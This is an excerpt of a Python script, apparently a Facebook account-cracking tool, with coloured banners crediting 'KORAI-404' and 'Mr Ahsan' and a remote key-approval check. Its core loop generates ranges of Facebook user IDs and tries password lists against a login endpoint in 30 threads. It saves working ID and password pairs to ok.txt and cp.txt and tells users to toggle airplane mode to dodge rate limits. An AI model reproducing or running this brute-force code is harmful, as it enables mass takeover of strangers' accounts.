...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Ahsan\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : KORAI-404\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/KORAI-404\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./KORAI-404 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/KORAI-404/approval.txt/blob/main/approoval.py"])
	exit(" [=>] FACEBOOK :  https://www.facebook.com/Ahmâd Kïñg")
...
def notice():
	...
	runtxt("\033[0;97m Key Approval ke Liye Channel subscribe Krein >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key Wale admin ke Video pe comment krein")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/KORAI-404/approval.txt/blob/main/approoval.py').text
			if basesplit in plr:
				key = basesplit
 ...
 |_|\_\___/|_|  \__,_|_|
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Ahsan\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : KORAI-404 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/KORAI-404\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./safdar.baloch.395 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(Free Trial)"%(G,R,G,Y,B))
	...
	def fbtua(self):
		...
		xx = 99999999
		idx = "1000000" 
		limit = int(input("    \033[0;97m[=>]\033[0;97m TYPE 100000 (LIMIT 500000): "))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIROPLANE MODE/FLIGHT MODE ON KRO ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Ahsan=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Ahsan=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Ahsan=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Ahsan=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/safdar.baloch.395")
		print(" [*] YouTube   : https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw")
		exit(" [*] GitHub    : https://github.com/KORAI-404")
	else:
		Main()
